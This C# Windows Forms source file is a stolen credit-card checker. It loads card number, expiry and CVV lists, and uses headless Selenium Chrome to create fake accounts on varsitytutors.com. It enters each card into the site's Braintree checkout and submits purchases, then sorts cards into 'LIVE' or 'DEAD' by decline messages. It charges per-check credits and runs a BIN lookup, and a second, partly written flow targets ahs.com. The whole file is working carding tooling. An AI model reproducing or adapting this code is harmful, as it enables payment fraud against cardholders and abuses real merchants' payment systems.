using Dominio;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Data;
using System.IO;
using WMPLib;
using Keys = OpenQA.Selenium.Keys;


namespace Presentacion
{
    public partial class nocharge : Form
    {
        public nocharge()
        {
            InitializeComponent();
        }

        static string correo()
        {
            var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var Charsarr = new char[8];
            var random = new Random();

            for (int i = 0; i < Charsarr.Length; i++)
            {
                Charsarr[i] = characters[random.Next(characters.Length)];
            }

            var resultString = new String(Charsarr);
            return resultString;
        }

        string mm = "wemop57340@slvlog.com";
        string nn = "Hanksac Beth";
        string cn = "asAdeqw@dwfwe3";
        string pp = "asAdeqw@dwfwe3";
        IWebDriver driver;
        public static class global
        {
            public static string pauseon = "no";
        }
        private void f()
        {
            this.dataGridView1.Rows.Remove(this.dataGridView1.Rows[0]);
        }
        private object Tarjetas()
        {
            throw new NotImplementedException();
        }
        private void nocharge_Load(object sender, EventArgs e)
        {

        }

        struct Datos
        {
            public string creditos;
        }

        private void btniniciar_Click(object sender, EventArgs e)
        {

            this.Close();
        }

        private void btnpausa_Click(object sender, EventArgs e)
        {
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Pausado";
            global.pauseon = "si";
            try
            {
                driver.Quit();
                

            }
            catch
            {

            }
        }

        private void btncargar_Click(object sender, EventArgs e)
        {
            //ABRIR
            openFileDialog1.ShowDialog();
            try
            {
                // =========================================================
                char Separador;
                DataTable datagrid = new DataTable();
                DataRow dr;
                //==========================================================
                lblstatus.Text = "Cargadas correctamente!";
                lblstatus.ForeColor = Color.Gold;

                datagrid.Columns.Add("CC");
                datagrid.Columns.Add("MES");
                datagrid.Columns.Add("ANO");
                datagrid.Columns.Add("CVV");
                dr = datagrid.NewRow();
                //=============================================================
                System.IO.StreamReader Archivo = new System.IO.StreamReader(openFileDialog1.FileName);
                Separador = Convert.ToChar("|");
                while (Archivo.Peek() != -1)
                {
                    datagrid.Rows.Add(Archivo.ReadLine().Split(Separador));

                }
                dataGridView1.DataSource = datagrid;
                this.Tarjetas();
                dataGridView1.CurrentRow.Selected = true;
                // =============================================================
            }
            catch (Exception)
            {

            }
            this.tContador.Start();
            //ORGANIZADOR GRID
            int tmn;
            var loopTo = dataGridView1.ColumnCount - 1;
            for (tmn = 0; tmn <= loopTo - 1; tmn++)
            {
                if (tmn == dataGridView1.ColumnCount - 1)
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
                }
                else
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
                }

            }
            lblContador.Visible = true;
        }



        private void tContador_Tick(object sender, EventArgs e)
        {
            int suma = 0;
            try
            {
                var loopTo = dataGridView1.RowCount - 1;
                for (int i = 0; i <= loopTo; i++)
                {
                    if (Convert.ToBoolean(dataGridView1.Rows[i].Cells[1].ColumnIndex))
                    {
                        suma += 1;
                    }

                }

                this.lblContador.Text = Convert.ToString(suma);
            }
            catch (Exception)
            {
                lblContador.Text = "0";
            }

            if ((lblContador.Text == "1"))
            {
                lblContador.Text = "0";
                this.tContador.Stop();
                lblstatus.Text = "Finalizado!";
                lblstatus.ForeColor = Color.Red;

            }
        }

        private void btnlimpiar_Click(object sender, EventArgs e)
        {
            try
            {
                driver.Close();

            }
            catch
            {

            }
            dataGridView1.DataSource = null;
            dataGridView1.Rows.Clear();
            dataGridView1.Refresh();
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Cleaned";
            lives.Items.Clear();
            lblive.Text = "0";
            deads.Items.Clear();
            lbldead.Text = "0";
        }

        private Thread hiloSecundario;

        private void button1_Click(object sender, EventArgs e)
        {

            Thread t = new Thread(() => TareaSecundaria(lblstatus, deads, lives, dataGridView1));
            global.pauseon = "no";
            t.Start();


        }

        void TareaSecundaria(object statusLabelObject, object deads, object lives, object DatagridView)
        {

            var statusLabel = statusLabelObject as Label;
            if (statusLabel == null)
                throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

            // Changes to controls must be performed on the UI thread.






            try
            {


                bool activa;


                if (lblContador.Text == "0")
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    activa = false;
                }
                else if (lblContador.Text == "1")
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    activa = false;
                }
                else if (Int32.Parse(lblContador.Text) > 300)
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"Demaciadas ccs!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                   activa = false;
                }
                else if (Int32.Parse(cache.creditos) < 5)
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    activa = false;
                }
                else
                {
                    activa = true;

                }



                while (activa == true)
                {
                    if (global.pauseon == "si")
                    {
                        driver.Close();
                        activa = false;
                    }
                    try
                    {

                        driver.Close();
                    }
                    catch
                    {

                    }

                    int num = 1;
                    primer();
                  
                    while (num < 10)
                    {
                        num++;


                        if (lblContador.Text == "0")
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else if (lblContador.Text == "1")
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else if (Int32.Parse(lblContador.Text) > 300)
                        {
                            BeginInvoke((Action)(() => statusLabel.Text = @"Demaciadas ccs!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else if (Int32.Parse(cache.creditos) < 5)
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            activa = false;
                        }
                        else
                        {
                            if (activa == false)
                            {
                                BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            }
                            else
                            {
                                agregandocc();
                                pagando();
                                validar();
                            }


                        }
                    }
                    driver.Close();

                }


            }
            catch (Exception ex)
            {

                string error = ex.Message;
                BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO X" + @error));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                

               // Thread.Sleep(50000);


                try
                {
                    driver.Close();
                }
                catch
                {

                }
                if (global.pauseon == "no")
                {
                    Thread t = new Thread(() => TareaSecundaria(lblstatus, deads, lives, dataGridView1));
                    global.pauseon = "no";
                    t.Start();
                }
               

            }

            void primer()
            {
               try { 
                var statusLabel = statusLabelObject as Label;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");
    
                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Iniciando (1/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                    string path = Directory.GetCurrentDirectory();
                    ChromeDriverService service = ChromeDriverService.CreateDefaultService(path, "chromedriver2.exe");
                    service.HideCommandPromptWindow = true;
                    ChromeOptions options = new ChromeOptions();
                    options.AddArgument("--headless");
                    options.AddArgument("no-sandbox");
                    options.AddArgument("--disable-extensions");
                    options.AddArgument("--disable-gpu");
                    options.AddArgument("--disable-dev-shm-usage");
                    options.AddArgument("--no-sandbox");
                    options.AddArgument("--ignore-certificate-errors");
                    options.AddArgument("--incognito");
                     options.AddArgument("window-size=1400,1000");
                  // options.AddArgument("--start-maximized");

                driver = new ChromeDriver(service, options);
                

                driver.Navigate().GoToUrl("https://www.varsitytutors.com/classes/vt-plus");

                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                Thread.Sleep(2000);
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                var Charsarr = new char[7];
                var random = new Random();

                for (int i = 0; i < Charsarr.Length; i++)
                {
                    Charsarr[i] = characters[random.Next(characters.Length)];
                }
                   var charactersnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                    var Charsarrnum = new char[5];
                    var randomnum = new Random();
                   

                    for (int i = 0; i < Charsarrnum.Length; i++)
                    {
                        Charsarrnum[i] = charactersnum[randomnum.Next(charactersnum.Length)];
                    }
                  
                    var correox = new String(Charsarr);
                    var correoxnum = new String(Charsarrnum);
                    var correo = correox + correoxnum;
               
               
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
             
                driver.FindElement(By.XPath("/html/body/main/div[1]/div[2]/div/div[1]/div/div/div/div[2]/div/a")).Click(); //join vt today
                Thread.Sleep(5000);
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                driver.FindElement(By.XPath("//*[@id='input-email']")).Click();   //ingresando correo
                driver.FindElement(By.XPath("//*[@id='input-email']")).SendKeys(correox + "cam"+ correoxnum + "@gmail.com");
                Thread.Sleep(2000);
                driver.FindElement(By.XPath("//*[@id='input-email']")).SendKeys(Keys.Enter);
                    BeginInvoke((Action)(() => statusLabel.Text = @"Configurando (2/6)"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                    Thread.Sleep(5000);
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("//*[@id='input-first-name']")).SendKeys("Daniel");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("//*[@id='input-last-name']")).SendKeys("Castellano");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("//*[@id='input-password']")).SendKeys("qwertyuiop123");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("//*[@id='input-password']")).SendKeys(Keys.Enter);
                    Thread.Sleep(50000);
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    driver.FindElement(By.XPath("//*[@id='input-phone']")).SendKeys("3118529541");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("//*[@id='input-postal-code']")).SendKeys("33116");
                    Thread.Sleep(1000);
                    driver.FindElement(By.XPath("/html/body/div/div[3]/div/div[3]/div/div[1]/div/div[1]/div[5]/div[4]/div/div[1]")).Click();
                    Thread.Sleep(3000);


                }
                catch
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO 2"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    try
                    {

                        
                        Thread.Sleep(2000);
                        driver.Close();
                    }
                    catch
                    {
                       

                    }
                }

            }

           


            void agregandocc()
            {
                if (global.pauseon == "si")
                {
                    driver.Quit();
                    return;
                }
                var statusLabel = statusLabelObject as Label;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

               

                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();
                if (year == "2022")
                {
                    year = "22";
                }
                if (year == "2023")
                {
                    year = "23";
                }
                if (year == "2024")
                {
                    year = "24";
                }
                if (year == "2025")
                {
                    year = "25";
                }
                if (year == "2026")
                {
                    year = "26";
                }
                if (year == "2027")
                {
                    year = "27";
                }
                if (year == "2028")
                {
                    year = "28";
                }
                if (year == "2029")
                {
                    year = "29";
                }
            
               
                    //select cardplay
                
               


                try
                {
                    if (global.pauseon == "si")
                    {
                        driver.Quit();
                        return;
                    }
                    
                    // Changes to controls must be performed on the UI thread.
                    BeginInvoke((Action)(() => statusLabel.Text = @"Agregando cc (3/6)"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                    IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                    wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));

                    driver.SwitchTo().Frame(driver.FindElement(By.Name("braintree-hosted-field-number")));
                    BeginInvoke((Action)(() => statusLabel.Text = @cc));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Yellow));
                    //driver.FindElement(By.XPath("//*[@name='cardnumber']")).SendKeys(Keys.Control + "a");
                    driver.FindElement(By.XPath("//*[@name='credit-card-number']")).SendKeys(cc);
                    driver.SwitchTo().DefaultContent();
                    // driver.SwitchTo().DefaultContent();
                    Thread.Sleep(1000);
                    // driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@name='exp-date']")));
                    //driver.FindElement(By.XPath("//*[@name='exp-date']")).SendKeys(Keys.Control + "a");
                    driver.SwitchTo().Frame(driver.FindElement(By.Name("braintree-hosted-field-expirationDate")));
                    driver.FindElement(By.XPath("//*[@name='expiration']")).SendKeys(month + year);
                    driver.SwitchTo().DefaultContent();
                    // driver.SwitchTo().DefaultContent();
                    Thread.Sleep(1000);
                    // driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='braintree-hosted-field-cvv']")));
                    //driver.FindElement(By.XPath("//*[@name='cvc']")).SendKeys(Keys.Control + "a");
                    driver.SwitchTo().Frame(driver.FindElement(By.Name("braintree-hosted-field-cvv")));
                    driver.FindElement(By.XPath("//*[@name='cvv']")).SendKeys(cvv);
                    driver.SwitchTo().DefaultContent();
                    Thread.Sleep(1000);
                   

                   
                    Thread.Sleep(1000);
                                        
                }
                catch
                {
                    Thread.Sleep(3000);

                    IWait<IWebDriver> waiit = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                    waiit.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                    agregandocc();
                }



            }

           

            void pagando()
            {
                if (global.pauseon == "si")
                {
                    driver.Quit();
                    return;
                }
                try
                {  var statusLabel = statusLabelObject as Label;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Pagando (4/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                driver.FindElement(By.XPath("//*[@id='review-order']")).Click();
                Thread.Sleep(3000);
                
                IWait<IWebDriver> waiit = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                waiit.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));

                    driver.FindElement(By.XPath("//*[@id='complete-purchase']")).Click();
                    Thread.Sleep(5000);
                }
                catch
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO 4"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    try
                    {
                        driver.Close();
                    }
                    catch
                    {

                    }
                }

            }


            void validar()
            {
                if (global.pauseon == "si")
                {
                    driver.Quit();
                    return;
                }
                try { 
                var statusLabel = statusLabelObject as Label;
                var livess = lives as ListBox;
                var deadss = deads as ListBox;
                var dataGridView1 = DatagridView as DataGridView;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Validando (5/6)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                Thread.Sleep(5000);
                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();
                
                if (driver.PageSource.Contains("Card Issuer Declined CVV")) 
                {
                    datos delete = new datos();
                    var eliminar = delete.Discount(cache.user);
                    cache.creditos = eliminar;
                    //eliminar = creditos.Text;
                    WindowsMediaPlayer musica;
                    musica = new WindowsMediaPlayer();
                    musica.URL = Application.StartupPath + @"\driver\live.mp3";
                    musica.controls.play();
                    datos bin = new datos();
                    string tarjt = cc + "|" + month + "|" + year + "|" + cvv;
                    var binlookup = delete.bin(cache.user, tarjt, "VENEZUELA");
                    BeginInvoke((Action)(() => statusLabel.Text = @"✔ LIVE ✔"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Green));
                    BeginInvoke((Action)(() => livess.Items.Add("✔ LIVE [GATE - VENEZUELA] - " + cc + " | " + month + " | " + year + " | " + cvv + "✔ - [Golpe De Estado] - [" + binlookup + "]")));

                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                    BeginInvoke((Action)(() => statusLabel.Text = @eliminar));
                    driver.Close();
                    primer();
                   


                }

                else if (driver.PageSource.Contains("Invalid Credit Card Number") || driver.PageSource.Contains("Do Not Honor") || driver.PageSource.Contains("Gateway Rejected: risk_threshold") || driver.PageSource.Contains("Cannot use a payment_method_nonce more than once") || driver.PageSource.Contains("Insufficient Funds") || driver.PageSource.Contains("Cardholder Stopped All Billing") || driver.PageSource.Contains("Voice Authorization Required")) 
                {
                    BeginInvoke((Action)(() => deadss.Items.Add("✘ DEAD [GATE - VENEZUELA] - " + cc + " | " + month + " | " + year + " | " + cvv + " - [Golpe De Estado]")));
                    BeginInvoke((Action)(() => statusLabel.Text = @"✘ DEAD ✘"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                        eliminando();

                }

               
                else
                {
                        driver.Close();
                        primer();

                         }

                }
                catch
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO 5"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    try
                    {
                        driver.Close();
                    }
                    catch
                    {

                    }
                }

            }

            void revalid()
            {
                validar();
            }

            void eliminando()
            {
                if (global.pauseon == "si")
                {
                    driver.Quit();
                    return;
                }
                try { 
                driver.FindElement(By.XPath("//*[@id='braintree-container']/div/div[1]/div[2]")).Click();
                Thread.Sleep(3000);
                driver.FindElement(By.XPath("//*[@id='braintree-container']/div/div[1]/div[5]/div[3]/div/div/div[1]/div")).Click();
                Thread.Sleep(3000);
                driver.FindElement(By.XPath("//*[@id='braintree-container']/div/div[1]/div[5]/div[2]/div[2]/div[2]")).Click();
                Thread.Sleep(3000);
                driver.FindElement(By.XPath("//*[@id='braintree-container']/div/div[1]/div[6]/div[2]/div/div[1]")).Click();
                }
                catch
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO 6"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                    try
                    {
                        driver.Close();
                    }
                    catch
                    {

                    }
                }
            }




        }






        void timer1_Tick(object sender, EventArgs e)
        {

            lblstatus.Text = "Iniciando (1/5)";
            lblstatus.ForeColor = Color.White;
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            ChromeOptions options = new ChromeOptions();
            // options.AddArgument("--headless");
            driver = new ChromeDriver(service);
            driver.Navigate().GoToUrl("https://www.ahs.com/");
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            if (driver.PageSource.Contains("¡Mensaje importante!"))
            {
                lblstatus.Text = "CAMBIA DE IP";
                lblstatus.ForeColor = Color.Red;
                timer1.Stop();
            }

            driver.FindElement(By.XPath("//*[@id='heroSection.ZipInputMobile']")).SendKeys("89107" + OpenQA.Selenium.Keys.Enter);
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.FindElement(By.XPath("//*[@id='leadFormAddress']")).SendKeys("1350 NW 2nd St, Miami, FL 33125");
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.FindElement(By.XPath("//*[@id='fbds-dialog-31-body']/div/div[6]/div/div[2]/input")).SendKeys("juanlopezasd@sad.com" + OpenQA.Selenium.Keys.Enter);
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            try
            {
                driver.FindElement(By.XPath("//*[@id='AddConf_submit']")).Click();
            }
            catch
            {

            }
            timer1.Stop();
            timer2.Start();

        }

        void timer2_Tick(object sender, EventArgs e)
        {
            lblstatus.Text = "Agregando al carrito (2/5)";
            lblstatus.ForeColor = Color.White;
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.FindElement(By.XPath("//*[@id='planCard.Button.choosePlan0.shieldsilver']")).Click();
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            WebElement conti = (WebElement)driver.FindElement(By.XPath("//*[@id='OrderSummary.Button.Submit']"));
            IJavaScriptExecutor executor = (IJavaScriptExecutor)driver;
            executor.ExecuteScript("arguments[0].click();", conti);
        }

        void timer3_Tick(object sender, EventArgs e)
        {
            lblstatus.Text = "Creando cuenta (3/5)";
            lblstatus.ForeColor = Color.White;
            driver.FindElement(By.XPath("//*[@id='contractFirstNameInput']")).SendKeys("Donjuan");
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.FindElement(By.XPath("//*[@id='contractLastNameInput']")).SendKeys("Sapo");
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.FindElement(By.XPath("//*[@id='contractPhoneNumberInput']")).SendKeys("2999999999");
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.FindElement(By.XPath("//*[@id='AddConf_submit']")).Click();

        }

        void timer4_Tick(object sender, EventArgs e)
        {
            lblstatus.Text = "Pagando (4/5)";
            lblstatus.ForeColor = Color.White;
            string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
            lblstatus.Text = cc;
            lblstatus.ForeColor = Color.White;
            timer4.Stop();
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
            driver.FindElement(By.XPath("//*[@id='paymentSelection']/div[1]/div/div/div[1]/div[2]/div/div/div/div/div[1]/div/div/div[2]/input")).Clear();
            driver.FindElement(By.XPath("//*[@id='paymentSelection']/div[1]/div/div/div[1]/div[2]/div/div/div/div/div[1]/div/div/div[2]/input")).SendKeys("Donjuan GDE");
            driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='paymentSelection']/div[1]/div/div/div[1]/div[2]/div/div/div/div/div[2]/div[1]/div/div[2]/div/iframe")));
            driver.FindElement(By.XPath("//*[@id='root']/form/span[2]/div/div[2]/span/input")).Clear();
            driver.FindElement(By.XPath("//*[@id='root']/form/span[2]/div/div[2]/span/input")).SendKeys("ccc");



        }




        private void tContador_Tick_1(object sender, EventArgs e)
        {
            int suma = 0;
            try
            {
                var loopTo = dataGridView1.RowCount - 1;
                for (int i = 0; i <= loopTo; i++)
                {
                    if (Convert.ToBoolean(dataGridView1.Rows[i].Cells[1].ColumnIndex))
                    {
                        suma += 1;
                    }

                }

                this.lblContador.Text = Convert.ToString(suma);
            }
            catch (Exception)
            {
                lblContador.Text = "0";
            }

            if ((lblContador.Text == "1"))
            {
                lblContador.Text = "0";
                this.tContador.Stop();
                lblstatus.Text = "Finalizado!";
                lblstatus.ForeColor = Color.Red;

            }
        }

        private void lives_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control == true && e.KeyCode == System.Windows.Forms.Keys.C)
            {
                string s = lives.SelectedItem.ToString();
                Clipboard.SetData(DataFormats.StringFormat, s);
            }
        }
    }
}
